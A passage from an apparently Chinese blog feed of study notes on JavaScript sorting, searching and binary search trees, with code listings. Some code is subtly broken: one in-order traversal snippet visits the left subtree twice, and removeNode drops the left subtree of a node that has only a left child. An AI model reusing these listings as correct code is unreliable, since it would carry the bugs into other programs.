O(n2)的算法。和冒泡排序一样，它包含有嵌套的两个循环，这导致了二次方的复杂度。然后，接下来要学的插入排序比选择排序的性能要好。 插入排序插入排序每次排一个数组项，以此方式构建最后的排序数组。假设第一项已经排序，接着，它和第二项进行比较，第二项是应该待在原位还是插入到第一项之前呢？这样，头两项就已经正确排序，接着和第三项比较（它是该插入到第一、第二还是第三的位置呢？），以此类推 实现： 123456789101112131415// 插入排序this.insertionSort = function()&#123; var length = array.length, j, temp; for(var i = 0; i &lt;length; i++)&#123; j = i; temp = array[i]; while(j &gt; 0 &amp;&amp; array[j - 1] &gt; temp)&#123; array[j] = array[j - 1] j--; &#125; array[j] = temp; &#125;&#125; 先声明代码中使用的变量，接着，迭代数组来给第i项找到正确的位置。注意，算法是从第二个位置而不是从0位置开始的。然后用i值来初始化一个辅助变量并将其保存于一临时变量中，便于之后将其插入到正确的位置上。下一步是找到正确的位置来插入项目。只要变量j比0大并且数组中前面的值比待比较的值大，我们就把这个值移到当前位置上并减小j。最终，该项目能插入到正确的位置上。 下面的示意图展示了一个插入排序的实例： 排序小型数组时，此算法比选择排序和冒泡排序性能都要好。 归并排序归并排序是第一个可以被实际使用的排序算法。归并排序性能复杂度为 O(nlog(n)) 归并算法是一种分治算法。其思想是将原始数组切成较小的数组，直到每个小数组只有一个位置，接着将小数组归并成较大的数组，直到最后一个排序完毕的大数组。 由于是分治法，归并排序也是递归的。 1234// 归并排序this.mergeSort = function()&#123; array = this.mergeSortRec(array);&#125; mergeSortRec 是递归函数 12345678910this.mergeSortRec = function(array)&#123; var length = array.length; if(length === 1)&#123; return array; &#125; var mid = Math.floor(length/2), left = array.slice(0,mid), right = array.slice(mid,length); return merge(arguments.callee(left),arguments.callee(right));&#125; 归并排序将一个大数组转化为一个小数组直到只有一个项。由于算法是递归的，我们需要一个停止条件，在这里条件是判断数组的长度是否为1.如果是，则直接返回这个长度为1的数组，因为它已经排序了。 如果数组长度比1大，那么我们得将其分成小数组。为此，首先要找到数组的中间行，找到后我们将数组分成两个小数组，分别叫做left 和 right 。 left 数组由索引0至中间索引的元素组成，而 right 数组由中间索引至原始数组最后一个位置的元素组成。 下面的步骤就是调用merge 函数，它负责合并和排序小数组来产生大数组，直到回到原始数组已排序完成。为了不断将原始数组分成小数组，我们得再次对left 数组和right 数组递归调用 mergeSortRec ，并同时作为参数传递给 merge 函数 12345678910111213141516171819function merge(left,right)&#123; var result = [], il = 0, ir = 0; while(il &lt; left.length &amp;&amp; ir &lt; right.length)&#123; if(left[il] &lt; right[ir])&#123; result.push(left[il++]); &#125;else&#123; result.push(right[ir++]); &#125; &#125; while(il &lt; left.length)&#123; result.push(left[il++]); &#125; while(ir &lt; right.length)&#123; result.push(right[ir++]); &#125; return result; &#125; merge 函数接受两个数组作为参数，并将它们归并至一个大数组。排序发生在归并过程中。首先，需要声明归并过程要创建的新数组已经用来迭代两个数组（left和right数组）所需要的两个变量。迭代两个数组的过程中，我们来自left 数组的项是否比来自right的数组的项小。如果是，将该项从left数组添加至归并结果数组，并递增迭代数组的控制变量；否则，从right数组添加项并递增相应的迭代数组的控制变量。 接下来，将left数组或right数组所有剩下的项添加到归并数组中。最后，将归并数组作为结果返回。 下图是具体的执行过程 可以看到，算法首先将原始数组分割成只有一个元素的子数组，然后开始排序。归并过程也会完成排序，知道原始数组完全合并并完成排序。 快速排序快速排序也许是最常用的排序算法了。它的复杂度为O(nlogn)，且它的性能通常比其他的复杂度为O(nlog(n))的排序算法要好。和归并算法一样，快速排序也是用分治 的方法，将原始算法分成了较小的数组（但它没有像归并排序那样将它们分割开） 快速排序比目前之前的排序算法要负责一些。 首先，从数组中选择中间一项作为主元 创建两个指针，左边一个指向数组的第一项，右边一个指向数组最后一项。移动左指针知道我们找到一个比主元大的元素，接着，移动右指针直到找到一个比主元小的元素，然后交换它们，重复这个过程，直到左指针超过了右指针。这个过程将使得比主元小的值都排在主元之前，而比主元大的值都排在主元之后。这一步叫做划分操作。 接着，算法对划分后的小数组（较主元小的值组成的子数组，以及较主元大的值组成的子数组）重复之前的两个步骤，直到数组已完全排序。 实现： 1234// 快速排序this.quickSort = function()&#123; this.quick(array,0,array.length-1);&#125; 像归并算法那样，开始我们声明一个主方法来调用递归函数，传递待排序数组，已经索引0及其最末的位置作为参数。 123456789101112this.quick = function(array,left,right)&#123; var index; if(array.length &gt; 1)&#123; index = partition(array,left,right); if(left &lt; index - 1 )&#123; arguments.callee(array,left,index-1); &#125; if(index &lt; right)&#123; arguments.callee(array,index,right); &#125; &#125;&#125; 首先声明 index ，该变量能帮助我们将子数组分离成较小值数组和较大值数组，这样，我们就能再次递归的调用quick函数了。partition 函数返回值将赋值给 index. 如果数组的长度比1大，我们就对给定子数组执行 partition 操作以得到 index 。如果子数组存在较小值的元素，则对该数组重复这个过程。同理，对存在较大值的子数组也是如此。 划分过程 第一件要做的事情就是选中主元（pivot）,有好几种方式，最简单的一种就是选中数组的第一项（最左项）。然而，研究表明对于几乎已排序的数组，这不是一个好的选择，它将导致该算法的最差表现。另外一种方式是随机选择一个数组或是选择中间项。 12345678910111213141516171819function partition(array,left,right)&#123; var pivot = array[Math.floor((left+right) / 2)], i = left, j = right; while(i &lt;= j)&#123; while(array[i] &lt; pivot)&#123; i++ &#125; while(array[j] &gt; pivot)&#123; j-- &#125; if(i &lt;= j)&#123; [array[i],array[j]] = [array[j],array[i]]; i++; j-- &#125; &#125; return i;&#125; 上面的实现中，我们选中中间项作为主元。我们初始化两个指针：left，初始化为数组第一个元素，right，初始化为数组最后一个元素。 只要left和right指针没有相互交错，就执行划分操作。首先，先移动left指针直到找到一个元素比主元大。对于right指针，我们做同样的事情，移动right指针直到我们找到一个元素比主元小。 当左指针指向的元素比主元大且右指针指向的元素比主元小，并且此时左指针索引没有右指针索引大，意思是左项比右项大。我们交换它们，然后移动两个指针，并重复这个过程。 在划分操作结束后，返回左指针的索引，用来在创建子数组。 快速排序实战 看一个快速排序的实际例子 给定数组（[3,5,1,6,4,7,2]），前面的示意图展示了划分操作的第一次执行。 下面的示意图展示了对有较小值的子数组执行的划分（注意7和6不包含在子数组之内） 接着，我们继续创建子数组，但是这次操作是针对上图中有较大值的子数组（有1那个较小数组不用再划分了，因为它仅含有一个项） 子数组（[2,3,5,4]）中的较小数组（[2,3]）继续划分。 然后子数组（[2,3,5,4]）中较大数组（[5,4]）也继续进行划分，示意图如下 最终，较大子数组（[6,7]）也会进行继续划分操作，快速排序算法的操作执行完成。 计数排序、桶排序和基数排序（分布式排序）目前为止，已经学习了如何不借助任何辅助数据结构的情况下对数组进行排序。还有一类被称为分布式排序的算法，原始数组中的数据会分发到多个中间结构（桶），再合起来放回原始数组。 最著名的分布式算法有计数排序、桶排序和基数排序。这里不做展开，有兴趣的请自行百度。 排序的相关代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160function createNonSortedArray(size)&#123; var array = new ArrayList(); for(var i = size; i &gt; 0; i--)&#123; array.insert(i); &#125; return array;&#125;function merge(left,right)&#123; var result = [], il = 0, ir = 0; while(il &lt; left.length &amp;&amp; ir &lt; right.length)&#123; if(left[il] &lt; right[ir])&#123; result.push(left[il++]); &#125;else&#123; result.push(right[ir++]); &#125; &#125; while(il &lt; left.length)&#123; result.push(left[il++]); &#125; while(ir &lt; right.length)&#123; result.push(right[ir++]); &#125; return result; &#125;function partition(array,left,right)&#123; var pivot = array[Math.floor((left+right) / 2)], i = left, j = right; while(i &lt;= j)&#123; while(array[i] &lt; pivot)&#123; i++ &#125; while(array[j] &gt; pivot)&#123; j-- &#125; if(i &lt;= j)&#123; [array[i],array[j]] = [array[j],array[i]]; i++; j-- &#125; &#125; return i;&#125;function ArrayList()&#123; var array = []; this.insert = function(item)&#123; array.push(item); &#125; this.toString = function()&#123; return array.join(); &#125; this.swap = function(index1,index2)&#123; var aux = array[index1]; array[index1] = array[index2]; array[index2] = aux; // [array[index1],array[index2]] = [array[index2],array[index1]] &#125; // 冒泡排序 this.bubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length -1; j++)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125; &#125; // 改进后的冒泡排序 this.modifiedBubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length-1-i; j++)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125; &#125; // 选择排序 this.selectionSort = function()&#123; var length = array.length, indexMin; for(var i = 0; i &lt; length; i++)&#123; indexMin = i; for(var j = i; j &lt; length; j++)&#123; if(array[indexMin] &gt; array[j])&#123; indexMin = j; &#125; &#125; if(i !== indexMin)&#123; this.swap(i,indexMin); &#125; &#125; &#125; // 插入排序 this.insertionSort = function()&#123; var length = array.length, j, temp; for(var i = 0; i &lt;length; i++)&#123; j = i; temp = array[i]; while(j &gt; 0 &amp;&amp; array[j - 1] &gt; temp)&#123; array[j] = array[j - 1] j--; &#125; array[j] = temp; &#125; &#125; // 归并排序 this.mergeSort = function()&#123; array = this.mergeSortRec(array); &#125; this.mergeSortRec = function(array)&#123; var length = array.length; if(length === 1)&#123; return array; &#125; var mid = Math.floor(length/2), left = array.slice(0,mid), right = array.slice(mid,length); return merge(arguments.callee(left),arguments.callee(right)); &#125; // 快速排序 this.quickSort = function()&#123; this.quick(array,0,array.length-1); &#125; this.quick = function(array,left,right)&#123; console.log(left+' '+right); var index; if(array.length &gt; 1)&#123; index = partition(array,left,right); if(left &lt; index - 1 )&#123; arguments.callee(array,left,index-1); &#125; if(index &lt; right)&#123; arguments.callee(array,index,right); &#125; &#125; &#125;&#125;// var array = createNonSortedArray(5);// console.log(array.toString());// array.quickSort();// console.log(array.toString()); const quickSortArray = new ArrayList();quickSortArray.insert(3);quickSortArray.insert(5);quickSortArray.insert(1);quickSortArray.insert(6);quickSortArray.insert(4);quickSortArray.insert(7);quickSortArray.insert(2);console.log(quickSortArray.toString());quickSortArray.quickSort();console.log(quickSortArray.toString()); 搜索算法回顾一下之前学过的算法，我们会发现BinarySearch Tree 类的search以及LinkedList类的indexOf 方法等都是搜索算法。当然，它们都是根据各自的数据结构来实现的。所以我们其实已经熟悉两个搜索算法了，只是还不知道它们的正式名称而已。 顺序搜索顺序或者线性搜索是基本的搜索算法。它的机制是，将每一个数据结构中的元素和我们要找的元素做比较。顺序搜索是最低效的一种搜索算法。 123456789// 顺序搜索this.sequentialSearch = function(item)&#123; for(var i = 0; i &lt; array.length; i++)&#123; if(item === array[i])&#123; return i; &#125; &#125; return -1;&#125; 顺序搜索迭代整个数组，并将每个数组元素和搜索项作比较。如果搜索到了，算法将返回值来标示搜索成功。返回值可以是该搜索项本身，或是true,又或是搜索项的索引。如果没有找到该项，则返回-1，表示该索引不存在，也可以考虑返回false或者null。 假定有数组（[5,4,3,2,1]）和待搜索值3，下图展示了顺序搜索的示意图 二分搜索二分搜索算法的原理和菜数字游戏类似。我们每回应一个数字。那个人就会说这个数字是高了还是低了或者是对了。 这个算法要求被搜索的数据结构已经排序。以下是该算法遵循的步骤 选择数组的中间值 如果选中值是待搜索值，那么算法执行完毕 如果待搜索值比选中的小，则返回步骤1并在选中值的左边的子数组中寻找 如果待搜索值比选中的大，则返回步骤1并在选中值的右边的子数组中寻找 实现： 12345678910111213141516171819// 二分搜索this.binarySearch = function(item)&#123; this.quickSort(); var low = 0, high = array.length - 1, mid,element; while(low &lt;= high)&#123; mid = Math.floor((low + high)/2); element = array[mid]; if(element &lt; item)&#123; low = mid + 1; &#125;else if(element &gt; item)&#123; high = mid - 1; &#125;else&#123; return mid; &#125; &#125; return -1;&#125; 开始前需要先排序数组，我们这这里选择了快速排序。在数组排序之后，我们设置low和high指针（它们是边界） 当low比high小时，我们计算得到中间项索引并取得中间项的值，此处如果low比high大，则意思是该搜索值不存在并返回-1.接着，我们比较选中项的值和搜索值。如果小了，则选择数组低半边并重新开始。如果选中项的值比搜索值大了，则选择数组高半边并重新开始。若两者都不是，则意味着选中项的值和搜索值相等，因此，直接返回该索引。 给定下图所示数组，试试搜索2.这是算法将会执行的步骤： 小结本章介绍了排序和搜索算法，包括冒泡、选择、插入、归并和快速排序，还有顺序搜索和二分搜索。下一章学习一些高级算法技巧。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第八章）—— 树]]></title>
    <url>%2F2018-11-05-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part8.html</url>
    <content type="text"><![CDATA[之前介绍了一些顺序数据结构，介绍的第一个非顺序数据结构是散列表。本章才会学习另一种非顺序数据结构——树，它对于存储需要快速寻找的数据非常有用。 本章内容 树的相关术语 创建树数据结构 树的遍历 添加和移除书的节点 AVL 树 第八章 树树数据结构树是一种分层数据的抽象模型。现实生活中最常见的树的典型例子就是家谱，或是公司的组织架构。如下图所示。 树的相关术语一个树结构包含一系列存在父子关系的节点。每个节点都有一个父节点（除了顶部的第一个节点）已经零个或者多个子节点： 位于树顶部的节点叫做根节点（11）。它没有父节点。树中的每个元素都叫做节点，节点分成内部节点和外部节点。至少有一个子节点的节点称为内部节点（7/5/9/12/13/20是内部节点）。没有子元素的节点被称为外部节点或者是叶节点（3/6/8/10/12/14/18/25 是叶节点）、 一个节点可以有祖先和后代，一个节点（除了根节点）的祖先包括父节点、祖父节点、增祖父节点等。一个节点的后代包括子节点、孙子节点、增孙子节点等。例如，节点5的祖先有节点7和节点11，后代有节点3和节点6. 有关树的另外一个术语是子树。子树由节点和它的后代构成。例如，节点13/12和14 构成了上图中的树的一颗子树。 节点的一个属性是深度，节点的深度取决于它的祖先节点的数量。比如，节点3有三个祖先节点（5/7/11），它的深度为3 树的高度取决于所有节点的深度的最大值。一颗树也可以被分解成层级。根节点在第0层，它的子节点在第1层，以此类推。上图中的树的高度为3 二叉树和二叉搜索树二叉树的节点最多只能有两个子节点：一个是左侧子节点，另外一个右侧子节点。这些定义有助于我们写出更高效的从树中插入、查找和删除节点的算法。二叉树在计算机科学中的应用非常广泛。 二叉搜索树（BST）是二叉树的一种，但是它只允许你在左侧节点存储（比父节点）小的值，在右侧节点存储（比父节点）大（或者等于）的值。 二叉搜索树将是我们在本章要研究的数据结构。 创建BinarySearchTree 类首先，声明它的结构： 12345678function BinarySearchTree()&#123; var Node = function(key)&#123; this.key = key; this.left = null; this.right = null; &#125; var root = null;&#125; 下面展现了二叉搜索树结构的组织方式： 和链表一样，将通过指针来表示节点之间的关系（术语称其为边）。在双向链表中，每个节点包含两个指针，一个指向下一个节点，一个指向上一个节点。对于树，使用同样的方式（也是使用两个指针）。但是，一个指向左侧子节点，另一个指向右侧子节点。因此，将声明一个 Node 类来表示的书的每个节点。不同于前面的章节，我们会将节点本身称为键而不是节点或者是项。键是树相关的术语种对节点的称呼。 我们将会遵循第五章 LinkedList 类相同的模式，这表示也将声明一个变量以控制此数据结构的第一个节点。在树中，它不再是头节点，而是根元素。 下面是将要在树类中实现的方法 insert（key）：向树中插入一个新的键 search（key）：在树中查找一个键，如果节点存在，则返回 true,否则返回 false inOrderTraverse：通过中序遍历方式遍历所有节点 preOrderTraverse：通过先序遍历方式遍历所有节点 postOrderTraverse：通过后序遍历方式遍历所有节点 min：返回树中最小的值/键 max：返回树中最大的值/键 remove（key）：从树中移除某个键 向树中插入一个键本章要实现的方法会比之前的要复杂很多，要用到递归。 12345678this.insert = function(key)&#123; var newNode = new Node(key); if(root === null)&#123; root = newNode; &#125;else&#123; insertNode(root,newNode) &#125;&#125; 要向树中插入一个新的节点，要经历三个步骤 是创建用来表示新节点的Node 类实例，只需要向构造函数传递我们想用来插入树的节点值，它的左指针和右指针会由构造函数与自动设置为 null 验证这个插入操作是否为一种特殊情况。这个特殊情况就是我们要插入的节点是树的第一个节点。如果是，就将节点指向新节点。 如果不是，就要将节点加在非根节点的其他位置。这种情况下，需要一个私有的辅助函数 123456789101112131415var insertNode = function(node,newNode)&#123; if(newNode.key &lt; node.key)&#123; if(node.left === null)&#123; node.left = newNode; &#125;else&#123; insertNode(node.left,newNode) &#125; &#125;else&#123; if(node.right === null)&#123; node.right = newNode; &#125;else&#123; insertNode(node.right,newNode) &#125; &#125;&#125; insertNode 函数会帮助我们找到新节点应该插入的正确位置，下面是这个函数实现的步骤。 如果树非空，需要找到插入新节点的位置，因此在调用 insertNode 方法时要通过参数传入根书的根节点和要插入的节点。 如果新节点的键小于当前节点的键（当前节点就是根节点），那么需要检查当前节点的左侧节点，需要通过递归调用 insertNode 方法继续需要树的下一层，在这里，下次将要比较的节点就会是当前节点的左侧节点。 如果节点的键大于当前节点的键，同时当前节点没有右侧子节点，就在那里插入洗的节点。如果有右侧子节点，同样需要递归调用 insertNode 方法，但是要用来和新节点比较的节点将会是右侧子节点。 树的遍历遍历一颗树是指访问树的每个节点并对它们进行某种操作的过程。访问树的所有节点有三种方法：中序、先序和后序。 中序遍历中序遍历是一种以上行顺序访问BST 所有节点的遍历方式，也就是以最小和最大的顺序访问所有节点。中序遍历的一种应用就是对数进行排序操作。实现： 123this.inOrderTraverse = function(callback)&#123; inOrderTraverseNode(root,callback);&#125; inOrderTraverse 方法接受一个回调函数作为参数。回调函数用来定义我们对遍历到的每个节点进行的操作（这也叫做访问者模式）。由于我们在BST 中最常见实现的算法是递归，这里使用一个私有的辅助函数，来接受一个节点和对应的回调函数作为参数。 1234567var inOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; inOrderTraverseNode(node.left, callback); callback(node.key) inOrderTraverseNode(node.left, callback); &#125;&#125; 要通过中序遍历的方法遍历一棵树，首先要检查以参数形式传入的节点是否为 null （这就是停止递归继续执行的判断条件） 然后递归调用相同的函数来访问左侧子节点，或者对这个节点进行一些操作（callback）,然后再访问右侧子节点。 测试。 123456789101112131415161718const tree = new BinarySearchTree();tree.insert(11);tree.insert(7);tree.insert(15);tree.insert(5);tree.insert(3);tree.insert(9);tree.insert(8);tree.insert(10);tree.insert(13);tree.insert(12);tree.insert(14);tree.insert(20);tree.insert(18);tree.insert(25);tree.insert(6);tree.inOrderTraverse(printNode);// 3 5 6 7 8 9 10 11 12 13 14 15 18 20 25 下面的图描述了 inOrderTraverse 方法的访问路径 先序遍历先序遍历是以优于后代节点的顺序访问每个节点的。先序遍历的一种应用就是打印一个结构化的文档。 实现： 123this.preOrderTraverse = function(callback)&#123; preOrderTraverseNode(root,callback); &#125; preOrderTraverseNode 方法的实现 1234567var preOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; callback(node.key) preOrderTraverseNode(node.left, callback); preOrderTraverseNode(node.right, callback); &#125;&#125; 先序遍历和中序遍历的不同点是，先序遍历会先访问节点的本身，然后再访问它的左侧子节点，最后是右侧子节点，而中序遍历的执行顺序是：先访问左侧子节点、接着节点本身，最后是右侧子节点。 下面是测试结果 12tree.preOrderTraverse(printNode);// 11 7 5 3 6 9 8 10 15 13 12 14 20 18 25 下面的描述了 preOrderTraverse 方法的访问路径 后序遍历后序遍历是先访问节点的后代节点，再访问节点本身。后序遍历的一种应用是计算一个目录和它的子目录中所有文件所占空间的大小。 实现： 123this.postOrderTraverse = function(callback)&#123; postOrderTraverseNode(root,callback);&#125; postOrderTraverseNode 方法的实现： 1234567var postOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; postOrderTraverseNode(node.left, callback); postOrderTraverseNode(node.right, callback); callback(node.key) &#125;&#125; 这个例子中，后序遍历会先访问左侧子节点，然后是右侧子节点，最后是父节点。 下面是测试结果 12tree.postOrderTraverse(printNode);// 3 6 5 8 10 9 7 12 14 13 18 25 20 15 11 下图描述了 postOrderTraverse 方法的访问路径 搜索树中的值在树中，有三种经常执行的搜索类型 搜索最大值 搜索最小值 搜索特定的值 搜索最小值和最大值我们使用下面的树作为实例 可以一眼发现树最后一层最左侧的节点的值为3，这是这棵树最小的键，如果你再看一眼最右端的树的节点，会发现是25，这是这棵树中最大的键。 首先，我们来寻找树的最小键的方法 123this.min = function()&#123; return minNode(root);&#125; min 方法将会暴露给用户，这个方法调用了 minNode方法。 123456789var minNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.left !== null)&#123; node = node.left &#125; return node.key &#125; return null;&#125; minNode 方法允许我们从树中任意一个节点开始寻找最小的键。我们可以使用它来知道一颗树或者它的子树中最小的键。因为，我们调用 minNode 方法的时候传入树的根节点，因为我们想找到这棵树的最小键。 在 minNode 内部，我们会遍历树的左边，直到找到树的最下层（最左端） 相似的方式，可以实现 max 方法 123456789101112this.max = function()&#123; return maxNode(root); &#125;var maxNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.right !== null)&#123; node = node.right &#125; return node.key &#125; return null;&#125; 测试 12console.log('这棵树的最大值：'+tree.max()); // 25console.log('这棵树的最小值：'+tree.min()); // 3 搜索一个特定的值实现 12345678910111213141516this.search = function(key)&#123; return searchNode(root,key)&#125;var searchNode = function(node,key)&#123; if(node === null)&#123; return false; &#125; if(key &lt; node.key)&#123; return searchNode(node.left, key) &#125;else if(key &gt; node.key)&#123; return searchNode(node.right, key) &#125;else&#123; return true &#125;&#125; 我们要做的第一件事就是声明 search 方法。和 BST 中声明的其他方法的模式相同，我们将会使用一个辅助函数。 searchNode 方法可以用来寻找一棵树或者它的任意子树中的一个特定的值。 在开始算法前，先验证作为传入参数的node 是否为 null.是则证明要找的键没有找到，返回 false. 如果传入的不是 null,需要继续验证，如果要找的键比当前的节点小，那么继续在左侧的子树上搜索，反之在右侧子节点开始继续搜索，否则就说明要找的键和当前节点的键相等，就返回 true来表示找到了这个键。 测试 12console.log(tree.search(3)); // trueconsole.log(tree.search(28)); // false 移除一个节点移除方法是最复杂的，实现 123this.remove = function(key)&#123; root = removeNode(root,key);&#125; 这个方法接受要移除并且它调用了 removeNode 方法，传入 root 和要移除的键作为参数。 removeNode 复制在于我们处理不同的运行场景，还是通过递归来实现。 12345678910111213141516171819202122232425262728293031var removeNode = function(node,key)&#123; if(node === null)&#123; return null; &#125; if(key &lt; node.key)&#123; node.left = removeNode(node.left,key) return node; &#125;else if(key &gt; node.key)&#123; node.right = removeNode(node.right,key) return node; &#125;else&#123; // 一个叶节点 if(node.left === null &amp;&amp; node.right === null)&#123; node = null; return node; &#125; // 只有一个子节点的节点 if(node.left === null)&#123; node = node.right return node; &#125;else if(node.right === null)&#123; node = node.right; return node; &#125; // 一个有两个子节点的节点 var aux = findMinNode(node.right); node.key = aux.key; node.right = removeNode(node.right,aux.key); return node; &#125;&#125; 移除一个叶节点 第一种情况是该节点是一个没有左侧或者右侧子节点的叶节点。在这种情况下，我们要做的就是给这个节点赋予 null 来移除它。但是学习了链表的实现后，我们知道仅仅赋予一个 null 值是不够的，还需要处理指针。在这里，这个节点没有任何的子节点，但是它有一个父节点，需要通过返回 null 来将对应的父节点指针赋值 null （return node）。 现在节点的值已经是 null ，父节点指向它的指针也会接收这个值，这也是我们在函数中返回节点的值的原因。父节点总是会接受到函数的返回值、另外一个可行的方法就是将父节点和节点本身都作为参数传入方法内部。 移除有一个左侧或右侧子节点的节点 移除有一个左侧子节点或右侧子节点的节点。在这种情况下，需要跳过这个节点，直接将父节点指向它的指针指向子节点。 如果这个节点没有左侧子节点，也就是说它有一个右侧子节点。因为我们把对它的引用改为对它右侧子节点的引用，并返回更新后的节点。如果这个节点没有右侧子节点，也是一样——把对它的引用改为对它左侧子节点的引用并返回更新后的值。 移除有两个子节点的节点 最复杂的情况就是要移除的节点有两个子节点——左侧子节点和右侧子节点。要移除有两个子节点的节点，需要执行四个步骤 当找到了需要移除的节点后，需要找到它右边子树中最小的节点（它的继承者 var aux = finMinNode(node.right)） 然后，用它右侧子树中最小节点的键去更新这个节点的值（node.key = zux.key）。通过这一步，我们改变了这个节点的键，也就是它被移除了。 但是，这样在树中就有两个拥有相同键的节点了，需要继续把右侧子树中的最小节点移除，毕竟它已经被移至要移除的节点的位置了。 最后，向它的父节点返回更新后节点的引用。 findMinNode 方法的实现和 min 方法的实现方式是一样的。唯一不同之处在于，在 min 方法中只返回键，而在 findMinNode 中返回了节点。 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163var insertNode = function(node,newNode)&#123; if(newNode.key &lt; node.key)&#123; if(node.left === null)&#123; node.left = newNode; &#125;else&#123; insertNode(node.left,newNode) &#125; &#125;else&#123; if(node.right === null)&#123; node.right = newNode; &#125;else&#123; insertNode(node.right,newNode) &#125; &#125;&#125;var inOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; inOrderTraverseNode(node.left, callback); callback(node.key) inOrderTraverseNode(node.right, callback); &#125;&#125; var preOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; callback(node.key) preOrderTraverseNode(node.left, callback); preOrderTraverseNode(node.right, callback); &#125;&#125; var postOrderTraverseNode = function(node, callback)&#123; if(node !== null)&#123; postOrderTraverseNode(node.left, callback); postOrderTraverseNode(node.right, callback); callback(node.key) &#125;&#125;var minNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.left !== null)&#123; node = node.left &#125; return node.key &#125; return null;&#125; var maxNode = function(node)&#123; if(node)&#123; while(node &amp;&amp; node.right !== null)&#123; node = node.right &#125; return node.key &#125; return null;&#125;var searchNode = function(node,key)&#123; if(node === null)&#123; return false; &#125; if(key &lt; node.key)&#123; return searchNode(node.left, key) &#125;else if(key &gt; node.key)&#123; return searchNode(node.right, key) &#125;else&#123; return true &#125;&#125;var removeNode = function(node,key)&#123; if(node === null)&#123; return null; &#125; if(key &lt; node.key)&#123; node.left = removeNode(node.left,key) return node; &#125;else if(key &gt; node.key)&#123; node.right = removeNode(node.right,key) return node; &#125;else&#123; // 一个叶节点 if(node.left === null &amp;&amp; node.right === null)&#123; node = null; return node; &#125; // 只有一个子节点的节点 if(node.left === null)&#123; node = node.right return node; &#125;else if(node.right === null)&#123; node = node.right; return node; &#125; // 一个有两个子节点的节点 var aux = findMinNode(node.right); node.key = aux.key; node.right = removeNode(node.right,aux.key); return node; &#125;&#125;var findMinNode = function(node)&#123; while(node &amp;&amp; node.left !== null)&#123; node = node.left; &#125; return node;&#125;var heightNode = function(node)&#123; if(node === null)&#123; return -1; &#125;else&#123; return Math.max(heightNode(node.left),heightNode(node.right))+ 1; &#125;&#125;var printNode = function(value)&#123; console.log(value);&#125;function BinarySearchTree()&#123; var Node = function(key)&#123; this.key = key; this.left = null; this.right = null; &#125; var root = null; this.insert = function(key)&#123; var newNode = new Node(key); if(root === null)&#123; root = newNode; &#125;else&#123; insertNode(root,newNode) &#125; &#125; this.search = function(key)&#123; return searchNode(root,key) &#125; this.inOrderTraverse = function(callback)&#123; inOrderTraverseNode(root,callback); &#125; this.preOrderTraverse = function(callback)&#123; preOrderTraverseNode(root,callback); &#125; this.postOrderTraverse = function(callback)&#123; postOrderTraverseNode(root,callback); &#125; this.min = function()&#123; return minNode(root); &#125; this.max = function()&#123; return maxNode(root); &#125; this.remove = function(key)&#123; root = removeNode(root,key); console.log(root); &#125; this.deep = function()&#123; return heightNode(root); &#125;&#125; 自平衡树BST 存在一个问题：取决于你添加的节点数，树的一条边可能会非常深，也就是说，树的一条分支会有很多层，而其他的分支却只有几层。 为了解决这个问题，有一种树叫做 Sdelson-Velskii-Land 树（AVL 树）。一种自平衡的二叉搜索树，意思是任何一个节点左右两侧子树的高度之差最多为1，也就是说这种树会在添加和移除节点时尽量试着成为一颗完全的树。 这里不做具体深入实现，尽管AVL树是自平衡的，其插入和移除节点的性能并不总是最好的。更好的选择是红黑树。红黑树可以高效有序的遍历其节点。有兴趣的请自行百度 小结这章介绍了广泛使用的基本树数据结构——二叉搜索树中添加、移除和搜索项的算法。同样介绍了访问树中每个节点的三种遍历方式——中序、先序、后序遍历 下一章，将学习图的基本概念，也是一种非线性的数据结构。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第九章）—— 图]]></title>
    <url>%2F2018-11-06-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part9.html</url>
